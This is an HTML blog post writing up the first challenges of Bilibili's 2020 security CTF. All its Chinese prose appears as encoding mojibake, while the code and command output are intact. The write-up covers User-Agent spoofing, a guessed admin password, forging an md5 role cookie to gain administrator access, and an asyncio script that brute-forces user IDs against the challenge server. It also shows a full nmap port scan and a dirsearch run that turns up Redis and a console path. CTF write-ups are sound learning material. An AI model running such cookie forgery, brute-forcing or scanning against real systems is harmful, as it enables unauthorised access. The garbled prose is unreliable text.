<!DOCTYPE html> <html lang=zh-Hans dir=ltr> <head> <script async src="https://www.googletagmanager.com/gtag/js?id=UA-179909808-1"></script> <script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","UA-179909808-1")</script> <meta charset=utf-8> <meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"> <title>Bç«™å®‰å…¨æŒ‘æˆ˜èµ›è§£ç­”è¿‡ç¨‹è®°å½• | shniubobo's Blog</title> <meta name=description content="Bç«™è¿™æ¬¡çš„å®‰å…¨æŒ‘æˆ˜èµ›çœ‹ä¸Šå»æŒºæœ‰æ„æ€ï¼Œå‰å‡ é¢˜ä¹ŸæŒºç®€å•çš„ï¼Œå°±è¯•ç€å‚åŠ äº†ä¸€ä¸‹ã€‚ç›®å‰åªåšå‡ºæ¥å‰äº”é¢˜ï¼›ä»ç¬¬å…­é¢˜å¼€å§‹ç½‘é¡µå°±è¿›ä¸å»äº†ï¼ŒåŒæ—¶ IP ä¹Ÿ ping ä¸é€šï¼Œåªèƒ½å…ˆç­‰é¡µé¢æ¢å¤æ­£å¸¸äº†ã€‚å…ˆé€šè¿‡è¿™ç¯‡æ–‡ç« è®°å½•ä¸€ä¸‹å‰äº”é¢˜çš„è§£ç­”è¿‡ç¨‹ã€‚"> <meta name=keywords content=bilibili,Bç«™,1024,ç¨‹åºå‘˜èŠ‚,å®‰å…¨æŒ‘æˆ˜èµ›,è§£ç­”,ç­”æ¡ˆ> <link rel=stylesheet href=https://cdn.jsdelivr.net/npm/bootstrap@4.5.2/dist/css/bootstrap.min.css integrity="sha256-Ww++W3rXBfapN8SZitAvc9jw2Xb+Ixt0rvDsmWmQyTo=" crossorigin=anonymous> <link rel=stylesheet href=https://shniubobo.xyz/static/style.css> </head> <body class="d-flex flex-column"> <nav class="navbar navbar-expand navbar-light shadow-sm fixed-top px-lg-0"> <div class="container-lg container-fluid col-xxl-6 d-sm-flex d-block"> <div class="text-center text-sm-left"> <a class="navbar-brand ml-sm-0 mr-sm-3 mx-auto my-0 h1" href=https://shniubobo.xyz/ >shniubobo's Blog</a> </div> <div class="d-flex flex-grow-1 justify-content-center"> <div class="flex-sm-grow-1 navbar-nav"> <a class="nav-item nav-link" href=https://shniubobo.xyz/ >ä¸»é¡µ</a> </div> <div class="my-auto mr-n2 navbar-nav"> <a class="nav-item nav-link" id=feed href=https://shniubobo.xyz/feeds/all.atom.xml><svg class=icon><use xlink:href=#icon-feed></use></svg></a> </div> </div> </div> </nav> <div class="container-lg container-fluid col-xxl-6" id=content> <div class="row row-cols-4"> <div class="col-md-9 col-12 pl-lg-0"> <article class="border-0 card" id=article-card> <h2 id=title>Bç«™å®‰å…¨æŒ‘æˆ˜èµ›è§£ç­”è¿‡ç¨‹è®°å½•</h2> <div class="text-muted flex-grow-1" id=metadata><time datetime=2020-10-25>2020-10-25</time><span class=dot></span>Notes</div> <hr class=my-0> <div class="text-justify alert alert-light mb-0">Bç«™è¿™æ¬¡çš„å®‰å…¨æŒ‘æˆ˜èµ›çœ‹ä¸Šå»æŒºæœ‰æ„æ€ï¼Œå‰å‡ é¢˜ä¹ŸæŒºç®€å•çš„ï¼Œå°±è¯•ç€å‚åŠ äº†ä¸€ä¸‹ã€‚ç›®å‰åªåšå‡ºæ¥å‰äº”é¢˜ï¼›ä»ç¬¬å…­é¢˜å¼€å§‹ç½‘é¡µå°±è¿›ä¸å»äº†ï¼ŒåŒæ—¶ <span class=caps>IP</span> ä¹Ÿ pingÂ ä¸é€šï¼Œåªèƒ½å…ˆç­‰é¡µé¢æ¢å¤æ­£å¸¸äº†ã€‚å…ˆé€šè¿‡è¿™ç¯‡æ–‡ç« è®°å½•ä¸€ä¸‹å‰äº”é¢˜çš„è§£ç­”è¿‡ç¨‹ã€‚</div> <hr class=mt-0> <div> <div class="callout callout-info compound"> <p>ç”±äºæ¯ä¸ªäººè·å¾—çš„ <code>flag</code> ä¼¼ä¹æ˜¯ä¸åŒçš„ï¼Œå› æ­¤æ–‡ä¸­çš„æ‰€æœ‰ <code>flag</code> éƒ½æ›¿æ¢æˆäº† <code>[REDACTED]</code>ã€‚åŒæ—¶æ–‡ä¸­æ¶‰åŠçš„ Cookie å’Œæ—¥æœŸä¹Ÿéƒ½ä¼šæ›¿æ¢ä¸º <code>[REDACTED]</code>ã€‚</p> </div> <section id=id1> <h3>ç¬¬ä¸€é¢˜ï¼šé¡µé¢çš„èƒŒåæ˜¯ä»€ä¹ˆï¼Ÿ</h3> <p>è¿™é“é¢˜å¾ˆç®€å•ï¼Œå®¡æŸ¥å…ƒç´ é‡Œå¯ä»¥ç›´æ¥æ‰¾åˆ°ï¼š</p> <div class=highlight><pre><span></span><span class=p>&lt;</span><span class=nt>input</span> <span class=na>id</span><span class=o>=</span><span class=s>"flag1"</span> <span class=na>type</span><span class=o>=</span><span class=s>"hidden"</span> <span class=na>values</span><span class=o>=</span><span class=s>"flag1"</span> <span class=na>value</span><span class=o>=</span><span class=s>"[REDACTED]"</span><span class=p>></span>
</pre></div> </section> <section id=id2> <h3>ç¬¬äºŒé¢˜ï¼šçœŸæ­£çš„ç§˜å¯†åªæœ‰ç‰¹æ®Šçš„è®¾å¤‡æ‰èƒ½çœ‹åˆ°</h3> <p>ç¬¬äºŒé¢˜åŒæ ·å¾ˆç®€å•ã€‚æ ¹æ®é¡µé¢æç¤ºï¼š</p> <blockquote> éœ€è¦ä½¿ç”¨bilibili Security Browseræµè§ˆå™¨è®¿é—®ï½</blockquote> <p>å¾ˆå®¹æ˜“æƒ³åˆ°éœ€è¦ä¿®æ”¹ <code>User-Agent</code>ã€‚æœ‰ä¸¤ç§åŠæ³•ã€‚</p> <p>ç¬¬ä¸€ç§æ–¹æ³•ã€‚å¯ä»¥ç›´æ¥åœ¨ Chrome çš„ DevTools ä¸­ï¼Œæ‰¾åˆ° Network conditions é€‰é¡¹å¡ï¼Œç„¶åå–æ¶ˆå‹¾é€‰ User agent ä¸€æ çš„ <code>Select automatically</code>ï¼Œå¹¶åœ¨ä¸‹é¢é€‰æ‹© <code>Custom...</code>ï¼Œå¡«å…¥ <code>bilibili Security Browser</code>ã€‚åˆ·æ–°ä¸€ä¸‹å³å¯çœ‹åˆ°ç­”æ¡ˆã€‚</p> <p>ç¬¬äºŒç§æ–¹æ³•ã€‚å¯ä»¥é€šè¿‡å„ç§ <span class=caps>HTTP</span> å®¢æˆ·ç«¯ï¼Œå¦‚ <code>curl</code>ã€<code>wget</code>ã€Postman ç­‰å‘ <span class=caps>API</span> å‘é€è¯·æ±‚ã€‚æˆ‘è¿™é‡Œé€‰æ‹©ä½¿ç”¨ <code>httpie</code>ï¼Œä¸»è¦æ˜¯ç”¨èµ·æ¥æ¯”è¾ƒæ–¹ä¾¿ã€‚é¦–å…ˆé€šè¿‡å®¡æŸ¥å…ƒç´ æ‰¾åˆ°æ¥å£ï¼š</p> <div class=highlight><pre><span></span><span class=p>&lt;</span><span class=nt>script</span><span class=p>></span>
    <span class=nx>$</span><span class=p>.</span><span class=nx>ajax</span><span class=p>({</span>
<span class=hll>        <span class=nx>url</span><span class=o>:</span> <span class=s2>"api/ctf/2"</span><span class=p>,</span>
</span>        <span class=nx>type</span><span class=o>:</span> <span class=s2>"get"</span><span class=p>,</span>
        <span class=nx>success</span><span class=o>:</span><span class=kd>function</span> <span class=p>(</span><span class=nx>data</span><span class=p>)</span> <span class=p>{</span>
            <span class=c1>//console.log(data);</span>
            <span class=k>if</span> <span class=p>(</span><span class=nx>data</span><span class=p>.</span><span class=nx>code</span> <span class=o>==</span> <span class=mi>200</span><span class=p>){</span>
                <span class=c1>// å¦‚æœæœ‰å€¼ï¼šå‰ç«¯è·³è½¬</span>
                <span class=nx>$</span><span class=p>(</span><span class=s1>'#flag2'</span><span class=p>).</span><span class=nx>html</span><span class=p>(</span><span class=s2>"flag2: "</span> <span class=o>+</span> <span class=nx>data</span><span class=p>.</span><span class=nx>data</span><span class=p>);</span>
            <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
                <span class=c1>// å¦‚æœæ²¡å€¼</span>
                <span class=nx>$</span><span class=p>(</span><span class=s1>'#flag2'</span><span class=p>).</span><span class=nx>html</span><span class=p>(</span><span class=s2>"éœ€è¦ä½¿ç”¨bilibili Security Browseræµè§ˆå™¨è®¿é—®ï½"</span><span class=p>);</span>
            <span class=p>}</span>
        <span class=p>}</span>
    <span class=p>})</span>
<span class=p>&lt;/</span><span class=nt>script</span><span class=p>></span>
</pre></div> <p>ä»é«˜äº®çš„è¿™ä¸€è¡Œï¼Œå¯ä»¥çœ‹å‡ºæ¥å£æ˜¯ <code>http://45.113.201.36/api/ctf/2</code>ã€‚æ­¤å¤–ä¹Ÿå¯ä»¥é€šè¿‡ DevTools çš„ NetworkÂ é€‰é¡¹å¡æ‰¾åˆ°æ¥å£ï¼Œä¸å†èµ˜è¿°ã€‚</p> <p>ç„¶åå°±æ˜¯å‘é€è¯·æ±‚ã€‚å‘é€è¯·æ±‚æ—¶è®°å¾—å¸¦ä¸Š <code>Cookie</code>ï¼Œå¦åˆ™ä¼šæç¤ºâ€œè¯·å…ˆç™»å½•â€ï¼š</p> <div class=highlight><pre><span></span><span class=gp>$</span> http http://45.113.201.36/api/ctf/2 <span class=se>\</span>
    <span class=s2>"User-Agent: bilibili Security Browser"</span> <span class=se>\</span>
    <span class=s2>"Cookie: [REDACTED]"</span>
<span class=go>HTTP/1.1 200 OK</span>
<span class=go>Connection: keep-alive</span>
<span class=go>Content-Length: 67</span>
<span class=go>Content-Type: application/json</span>
<span class=go>Date: [REDACTED]</span>
<span class=go>Server: nginx/1.10.3</span>
<span class=go>Vary: Cookie</span>

<span class=go>{</span>
<span class=go>    "code": 200,</span>
<span class=go>    "data": "[REDACTED]",</span>
<span class=go>    "msg": ""</span>
<span class=go>}</span>
</pre></div> </section> <section id=id3> <h3>ç¬¬ä¸‰é¢˜ï¼šå¯†ç æ˜¯å•¥ï¼Ÿ</h3> <p>è¯´å®è¯è¿™é“é¢˜æˆ‘ç›´åˆ°æœ€åéƒ½æ²¡æœ‰æƒ³å‡ºè§£æ³•ã€‚å‡ ä¸ªæˆ‘è®¤ä¸ºå¯èƒ½æœ‰ç”¨çš„åœ°æ–¹ <a class=m-footnote href=#id11 id=id4>1</a>ï¼š</p> <div class=highlight><pre><span></span><span class=p>&lt;</span><span class=nt>meta</span> <span class=na>name</span><span class=o>=</span><span class=s>"flag3"</span> <span class=na>content</span><span class=o>=</span><span class=s>"width=device-width, initial-scale=1.0"</span><span class=p>></span>
</pre></div> <div class=highlight><pre><span></span><span class=p>&lt;</span><span class=nt>script</span><span class=p>></span>
    <span class=c1>//falg 3</span>

    <span class=nx>$</span><span class=p>(</span><span class=s2>"#submit"</span><span class=p>).</span><span class=nx>click</span><span class=p>(</span><span class=kd>function</span><span class=p>(){</span>

        <span class=nx>$</span><span class=p>.</span><span class=nx>ajax</span><span class=p>({</span>
            <span class=nx>url</span><span class=o>:</span> <span class=s2>"api/ctf/3"</span><span class=p>,</span>
            <span class=nx>type</span><span class=o>:</span> <span class=s2>"post"</span><span class=p>,</span>
            <span class=nx>contentType</span><span class=o>:</span> <span class=s2>"application/json"</span><span class=p>,</span>
            <span class=nx>dataType</span><span class=o>:</span><span class=s2>"json"</span><span class=p>,</span>
            <span class=nx>data</span><span class=o>:</span> <span class=nx>JSON</span><span class=p>.</span><span class=nx>stringify</span><span class=p>({</span>
<span class=hll>                <span class=nx>username</span><span class=o>:</span> <span class=nx>$</span><span class=p>(</span><span class=s2>"#name"</span><span class=p>).</span><span class=nx>val</span><span class=p>(),</span>
</span><span class=hll>                <span class=nx>passwd</span><span class=o>:</span> <span class=nx>$</span><span class=p>(</span><span class=s2>"#subject"</span><span class=p>).</span><span class=nx>val</span><span class=p>(),</span>
</span>            <span class=p>}),</span>
            <span class=nx>success</span><span class=o>:</span><span class=kd>function</span> <span class=p>(</span><span class=nx>data</span><span class=p>)</span> <span class=p>{</span>
                <span class=k>if</span> <span class=p>(</span><span class=nx>data</span><span class=p>.</span><span class=nx>code</span> <span class=o>==</span> <span class=mi>200</span><span class=p>){</span>
                    <span class=nx>alert</span><span class=p>(</span><span class=s2>"flag is: "</span> <span class=o>+</span> <span class=nx>data</span><span class=p>.</span><span class=nx>data</span><span class=p>);</span>
                <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
                    <span class=nx>alert</span><span class=p>(</span><span class=s2>"ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯ï½"</span><span class=p>);</span>
                <span class=p>}</span>
            <span class=p>}</span>
        <span class=p>})</span>
        <span class=p>});</span>
  <span class=p>&lt;/</span><span class=nt>script</span><span class=p>></span>
</pre></div> <p>ç„¶è€Œå„ç§å°è¯•æ— æœï¼Œå„ç§å¼±å¯†ç ä¹Ÿè¯•ä¸å‡ºæ¥ï¼Œæœ€ååœ¨ <a href="https://www.hostloc.com/forum.php?mod=redirect&goto=findpost&ptid=757940&pid=9345926" rel=noreferrer target=_blank>è¿™ä¸ªå¸–å­</a> é‡Œæ‰¾åˆ°äº†ç­”æ¡ˆï¼Œç”¨æˆ·åæ˜¯ <code>admin</code>ï¼Œå¯†ç æ˜¯ <code>bilibili</code>ï¼Œç„¶è€Œå¹¶æ²¡æœ‰è§£é‡Šæ˜¯å¦‚ä½•å¾—åˆ°è¿™ä¸ªç­”æ¡ˆçš„ã€‚</p> </section> <section id=id6> <h3>ç¬¬å››é¢˜ï¼šå¯¹ä¸èµ·ï¼Œæƒé™ä¸è¶³ï½</h3> <p>å’Œç¬¬äºŒé¢˜ä¸€æ ·æ‰¾åˆ°æ¥å£ï¼Œä»è¿™ä¸€é¢˜å¼€å§‹ä¼šå‘ç° Cookie ä¸­å¤šäº† <code>role</code> ä¸€é¡¹ï¼Œæ¨æµ‹å’Œä»–æœ‰å…³ã€‚è§‚å¯Ÿå‘ç° <code>role</code> ä¸€å…±æœ‰ 32 ä½ï¼Œä¸”éƒ½åœ¨ <code>[0-9a-f]</code> çš„èŒƒå›´å†…ï¼Œæ•…æ¨æµ‹æ˜¯ md5 è¿‡çš„ä¿¡æ¯ã€‚é¡µé¢ä¸Šæç¤ºâ€œè¶…çº§ç®¡ç†å‘˜â€ï¼Œæ‰€ä»¥å¯ä»¥è¯•è¯•å„ç§å’Œç®¡ç†å‘˜ç›¸å…³çš„è¯ï¼Œæ¯”å¦‚è¯´ <code>admin</code>ã€<code>administrator</code>ã€<code>root</code> ç­‰ã€‚æœ€åå‘ç°æ˜¯ <code>Administrator</code> ï¼ˆé¦–å­—æ¯å¤§å†™ï¼‰ï¼š</p> <div class=highlight><pre><span></span><span class=gp>$</span> python -c <span class=s2>"from hashlib import md5; print(md5(b'Administrator').hexdigest())"</span>
<span class=go>7b7bc2512ee1fedcd76bdc68926d4f7b</span>
<span class=gp>$</span> http http://45.113.201.36/api/ctf/4 <span class=se>\</span>
    <span class=s2>"Cookie: session=[REDACTED]; role=7b7bc2512ee1fedcd76bdc68926d4f7b"</span>
<span class=go>HTTP/1.1 200 OK</span>
<span class=go>Connection: keep-alive</span>
<span class=go>Content-Length: 67</span>
<span class=go>Content-Type: application/json</span>
<span class=go>Date: [REDACTED]</span>
<span class=go>Server: nginx/1.10.3</span>
<span class=go>Vary: Cookie</span>

<span class=go>{</span>
<span class=go>    "code": 200,</span>
<span class=go>    "data": "[REDACTED]",</span>
<span class=go>    "msg": ""</span>
<span class=go>}</span>
</pre></div> </section> <section id=id7> <h3>ç¬¬äº”é¢˜ï¼šåˆ«äººçš„ç§˜å¯†</h3> <p>é¦–å…ˆè¯•äº†å‡ æ¬¡è¿™é¢˜çš„ <span class=caps>API</span>ï¼Œä¸ç®¡å“ªä¸ª <code>uid</code> è¿”å›çš„ <code>code</code> ä¸€ç›´éƒ½æ˜¯ <code>403</code>ã€‚è§‚å¯Ÿäº†ä¸€ä¸‹é¡µé¢æ²¡å‘ç°ä»€ä¹ˆä¿¡æ¯ï¼Œæ•…æ‰“ç®—ç›´æ¥æš´åŠ›ç ´è§£ã€‚</p> <p>ä¸€å¼€å§‹å†™çš„è„šæœ¬ç”¨çš„æ˜¯ <code>requests</code> ï¼ˆPython æœ€å¸¸ç”¨çš„ <span class=caps>HTTP</span> åº“ï¼‰ï¼Œä½†æ˜¯é€Ÿåº¦æ„Ÿäººï¼Œåˆæ¢æˆäº† <code>aiohttp</code>ã€‚è·‘äº†å¾ˆä¹…ï¼ŒæœåŠ¡å™¨è¿˜ç»å¸¸ä¸ç¨³å®š 404ï¼Œå§‹ç»ˆæ²¡æ‰¾å‡ºæ­£ç¡®çš„ <code>uid</code>ã€‚</p> <p>åæ¥çªç„¶æƒ³èµ·åœ¨ç½‘é¡µé‡Œæœ‰çœ‹åˆ°ä¸€ä¸ª <code>uid</code>ï¼Œæ˜¯ <code>100336889</code>ï¼ŒçŒœæµ‹ç­”æ¡ˆå’Œè¿™ä¸ªæœ‰å…³ã€‚è¯•äº†ä¸€ä¸‹è¿™ä¸ª <code>uid</code>ï¼Œä¾æ—§ <code>403</code>ï¼ŒåˆæŠŠè¿™ä¸ªä½œä¸ºèµ·å§‹ <code>uid</code> æ”¾è¿›æš´åŠ›ç ´è§£çš„è„šæœ¬é‡Œï¼Œæ²¡æƒ³åˆ°ä¸€ç¬é—´å°±è¯•å‡ºæ¥äº†ğŸ¤¦â€â™‚ï¸ã€‚</p> <p>è™½ç„¶æœ‰äº›æ€é¸¡ç”¨ç‰›åˆ€çš„æ„Ÿè§‰ï¼Œè¿˜æ˜¯æŠŠè„šæœ¬ä»£ç æ”¾å‡ºæ¥å§ğŸ˜…ï¼š</p> <table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65</pre></div><td class=code><div class=highlight><pre><span></span><span class=sd>"""\</span>
<span class=sd>Copyright (c) 2020 shniubobo</span>

<span class=sd>Permission is hereby granted, free of charge, to any person obtaining a</span>
<span class=sd>copy of this software and associated documentation files (the "Software"),</span>
<span class=sd>to deal in the Software without restriction, including without limitation</span>
<span class=sd>the rights to use, copy, modify, merge, publish, distribute, sublicense,</span>
<span class=sd>and/or sell copies of the Software, and to permit persons to whom the</span>
<span class=sd>Software is furnished to do so, subject to the following conditions:</span>

<span class=sd>The above copyright notice and this permission notice shall be included in</span>
<span class=sd>all copies or substantial portions of the Software.</span>

<span class=sd>THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR</span>
<span class=sd>IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,</span>
<span class=sd>FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE</span>
<span class=sd>AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER</span>
<span class=sd>LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING</span>
<span class=sd>FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER</span>
<span class=sd>DEALINGS IN THE SOFTWARE.</span>
<span class=sd>"""</span>
<span class=kn>import</span> <span class=nn>asyncio</span>

<span class=kn>import</span> <span class=nn>aiohttp</span>
<span class=kn>from</span> <span class=nn>retrying</span> <span class=kn>import</span> <span class=n>retry</span>

<span class=n>FROM</span> <span class=o>=</span> <span class=mi>100336889</span>
<span class=n>URL</span> <span class=o>=</span> <span class=s1>'http://45.113.201.36/api/ctf/5'</span>
<span class=n>success</span> <span class=o>=</span> <span class=n>asyncio</span><span class=o>.</span><span class=n>Event</span><span class=p>()</span>


<span class=nd>@retry</span><span class=p>(</span><span class=n>stop_max_attempt_number</span><span class=o>=</span><span class=mi>10</span><span class=p>)</span>
<span class=k>async</span> <span class=k>def</span> <span class=nf>make_request</span><span class=p>(</span><span class=n>uid</span><span class=p>,</span> <span class=n>session</span><span class=p>):</span>
    <span class=k>async</span> <span class=k>with</span> <span class=n>session</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>URL</span><span class=p>,</span> <span class=n>params</span><span class=o>=</span><span class=p>{</span><span class=s1>'uid'</span><span class=p>:</span> <span class=n>uid</span><span class=p>},</span>
                           <span class=n>raise_for_status</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span> <span class=k>as</span> <span class=n>resp</span><span class=p>:</span>
        <span class=n>resp_json</span> <span class=o>=</span> <span class=k>await</span> <span class=n>resp</span><span class=o>.</span><span class=n>json</span><span class=p>()</span>
        <span class=k>if</span> <span class=nb>int</span><span class=p>(</span><span class=n>resp_json</span><span class=p>[</span><span class=s1>'code'</span><span class=p>])</span> <span class=o>==</span> <span class=mi>200</span><span class=p>:</span>
            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>'SUCCESS - </span><span class=si>{</span><span class=n>uid</span><span class=si>}</span><span class=s1>:</span><span class=se>\n</span><span class=s1>'</span>
                  <span class=sa>f</span><span class=s1>'    data = </span><span class=si>{</span><span class=n>resp_json</span><span class=p>[</span><span class=s2>"data"</span><span class=p>]</span><span class=si>}</span><span class=se>\n</span><span class=s1>'</span>
                  <span class=sa>f</span><span class=s1>'    msg = </span><span class=si>{</span><span class=n>resp_json</span><span class=p>[</span><span class=s2>"msg"</span><span class=p>]</span><span class=si>}</span><span class=se>\n</span><span class=s1>'</span><span class=p>)</span>
            <span class=n>success</span><span class=o>.</span><span class=n>set</span><span class=p>()</span>


<span class=k>async</span> <span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
    <span class=n>cookies</span> <span class=o>=</span> <span class=p>{</span>
        <span class=s1>'role'</span><span class=p>:</span> <span class=s1>'[REDACTED]'</span><span class=p>,</span>
        <span class=s1>'session'</span><span class=p>:</span> <span class=s1>'[REDACTED]'</span><span class=p>,</span>
    <span class=p>}</span>
    <span class=k>async</span> <span class=k>with</span> <span class=n>aiohttp</span><span class=o>.</span><span class=n>ClientSession</span><span class=p>(</span><span class=n>cookies</span><span class=o>=</span><span class=n>cookies</span><span class=p>)</span> <span class=k>as</span> <span class=n>s</span><span class=p>:</span>
        <span class=n>uid</span> <span class=o>=</span> <span class=n>FROM</span>
        <span class=n>tasks</span> <span class=o>=</span> <span class=p>[]</span>
        <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
            <span class=nb>print</span><span class=p>(</span><span class=n>uid</span><span class=p>)</span>
            <span class=n>tasks</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>asyncio</span><span class=o>.</span><span class=n>create_task</span><span class=p>(</span><span class=n>make_request</span><span class=p>(</span><span class=n>uid</span><span class=p>,</span> <span class=n>s</span><span class=p>)))</span>
            <span class=k>if</span> <span class=n>uid</span> <span class=o>%</span> <span class=mi>100</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
                <span class=k>await</span> <span class=n>asyncio</span><span class=o>.</span><span class=n>gather</span><span class=p>(</span><span class=o>*</span><span class=n>tasks</span><span class=p>)</span>
                <span class=n>tasks</span><span class=o>.</span><span class=n>clear</span><span class=p>()</span>
            <span class=k>if</span> <span class=n>success</span><span class=o>.</span><span class=n>is_set</span><span class=p>():</span>
                <span class=k>break</span>
            <span class=n>uid</span> <span class=o>+=</span> <span class=mi>1</span>
        <span class=k>await</span> <span class=n>asyncio</span><span class=o>.</span><span class=n>gather</span><span class=p>(</span><span class=o>*</span><span class=n>tasks</span><span class=p>)</span>


<span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>'__main__'</span><span class=p>:</span>
    <span class=n>asyncio</span><span class=o>.</span><span class=n>run</span><span class=p>(</span><span class=n>main</span><span class=p>())</span>
</pre></div> </table><p>ç¨å¾®è§£é‡Šä¸€ä¸‹ã€‚ç¬¬ 32 è¡Œçš„ <code>@retry</code> æ˜¯ä¸ºäº†é˜²æ­¢æœåŠ¡å™¨ä¸ç¨³å®šå¯¼è‡´è„šæœ¬ç›´æ¥é€€å‡ºã€‚<code>make_request</code> ä¼šåœ¨æˆåŠŸæ—¶è°ƒç”¨ <code>success.set</code>ï¼Œå‘ŠçŸ¥ <code>main</code> ä¸ç”¨å†è¿è¡Œä¸‹å»äº†ã€‚</p> </section> <section id=id8> <h3>å‰©ä¸‹çš„é¢˜ç›®</h3> <p><s>ç¬¬å…­é¢˜çš„é¡µé¢å§‹ç»ˆè¿›ä¸å»ï¼Œä¹Ÿ pingÂ ä¸é€šã€‚æ•…éšœçš„è¯ä¸è‡³äºæŒç»­è¿™ä¹ˆä¹…ï¼Œçœ‹æ¥è¿™æˆ–è®¸æ˜¯æ­£å¸¸ç°è±¡ğŸ¤”ï¼Ÿä¹‹åå¦‚æœæˆ‘æ¢ç©¶å‡ºä¸ªæ‰€ä»¥ç„¶çš„è¯ä¹Ÿä¼šè¡¥ä¸Šè§£ç­”è¿‡ç¨‹ã€‚</s></p> <p>B ç«™ç¬¬äºŒå¤©å°±æ¢äº†æ–°çš„æœåŠ¡å™¨ï¼Œè™½ç„¶ä¾æ—§ä¸æ€ä¹ˆç¨³å®šï¼Œç»å¸¸ 404ã€503ï¼Œä½†è‡³å°‘èƒ½è¿›äº†ã€‚ç”±äºåé¢çš„å‡ é¢˜å¹¶ä¸æ˜¯æŒ‰ç…§ 6-10 çš„é¡ºåºè§£ç­”ï¼Œè€Œä¸”æˆ‘ä¹Ÿåªä½œå‡ºäº† 2Â é¢˜ï¼Œå°±éƒ½å†™åœ¨è¿™ä¸€éƒ¨åˆ†é‡Œäº†ã€‚</p> <p>è¿›å…¥ç¬¬å…­é¢˜çš„ç½‘é¡µåä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œé¡µé¢ä¸Šçš„æ‰€æœ‰é“¾æ¥æŒ‡å‘çš„é¡µé¢éƒ½æ˜¯ 404ï¼Œåªæœ‰ä¸€ä¸ªè¡¨å•åº”è¯¥æœ‰äº›ç”¨ã€‚ç‚¹å‡»å‘é€åä¼šå‘åŒä¸€ç½‘é¡µå‘é€ <span class=caps>POST</span>Â è¯·æ±‚ï¼Œè¡¨å•å†…çš„ä¿¡æ¯å¯¹åº”å…³ç³»æ˜¯ï¼š</p> <ul> <li>åå­— -> <code>name</code></li> <li>é‚®ç®± -> <code>email</code></li> <li>ç½‘å€ -> <code>url</code></li> <li>è¯„è®º -> <code>comment</code></li> </ul> <p>è¿”å›çš„é¡µé¢å’ŒåŸå…ˆä¸€æ¨¡ä¸€æ ·ï¼ŒçŒœæµ‹å¡«å†™ä¸€å®šçš„è¡¨å•ä¿¡æ¯ï¼Œæˆ–å°è¯•å°†æ–‡ä»¶ä½œä¸ºè¡¨å•ä¿¡æ¯å‘é€ï¼Œå¯èƒ½ä¼šè¿”å›ä¸ä¸€æ ·çš„é¡µé¢å†…å®¹ã€‚</p> <p>è¿™ä¸€é¢˜å¡ä½äº†ï¼Œäºæ˜¯å†³å®šæ‰«ä¸€ä¸‹ç›®å½•å’Œç«¯å£ã€‚</p> <div class=highlight><pre><span></span><span class=gp>$</span> nmap -p- <span class=m>45</span>.113.201.36

<span class=go>Starting Nmap 7.60 ( https://nmap.org ) at [REDACTED]</span>
<span class=go>Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan</span>
<span class=go>Ping Scan Timing: About 100.00% done; ETC: 21:08 (0:00:00 remaining)</span>
<span class=go>Nmap scan report for 45.113.201.36</span>
<span class=go>Host is up (0.024s latency).</span>
<span class=go>Not shown: 65529 filtered ports</span>
<span class=go>PORT     STATE  SERVICE</span>
<span class=go>80/tcp   open   http</span>
<span class=go>443/tcp  closed https</span>
<span class=go>1194/tcp closed openvpn</span>
<span class=hll><span class=go>6379/tcp open   redis</span>
</span><span class=go>8069/tcp closed unknown</span>
<span class=go>8091/tcp closed jamlink</span>

<span class=go>Nmap done: 1 IP address (1 host up) scanned in 401.56 seconds</span>
</pre></div> <div class=highlight><pre><span></span><span class=gp>$</span> ./dirsearch.py -E -u http://45.113.201.36/ -r -c <span class=s2>"[REDACTED]"</span>

<span class=go>  _|. _ _  _  _  _ _|_    v0.4.0</span>
<span class=go> (_||| _) (/_(_|| (_| )</span>

<span class=go>Extensions: php, asp, aspx, jsp, html, htm, js | HTTP method: GET | Threads: 20 | Wordlist size: 10023 | Recursion level: 1</span>

<span class=go>Error Log: [REDACTED]</span>

<span class=go>Target: http://45.113.201.36/</span>

<span class=go>Output File: [REDACTED]</span>

<span class=go>[REDACTED] Starting:</span>
<span class=go>[REDACTED] 301 -  185B  - /js  ->  http://45.113.201.36/js/     (Added to queue)</span>
<span class=go>[REDACTED] 301 -  310B  - /blog  ->  http://45.113.201.36/blog/     (Added to queue)</span>
<span class=go>[REDACTED] 200 -  473B  - /common.js</span>
<span class=hll><span class=go>[REDACTED] 301 -  185B  - /console  ->  http://45.113.201.36/console/     (Added to queue)</span>
</span><span class=hll><span class=go>[REDACTED] 403 -  571B  - /console/</span>
</span><span class=go>[REDACTED] 301 -  185B  - /css  ->  http://45.113.201.36/css/     (Added to queue)</span>
<span class=go>[REDACTED] 200 -    4KB - /favicon.ico</span>
<span class=go>[REDACTED] 200 -    3KB - /index.html</span>
<span class=go>[REDACTED] 200 -    4KB - /login.html</span>
<span class=go>[REDACTED] 200 -    9KB - /start.html</span>
<span class=go>[REDACTED] 200 -    3KB - /user.html</span>
<span class=go>[REDACTED] Starting: js/</span>
<span class=go>[REDACTED] 200 -  473B  - /js/common.js</span>
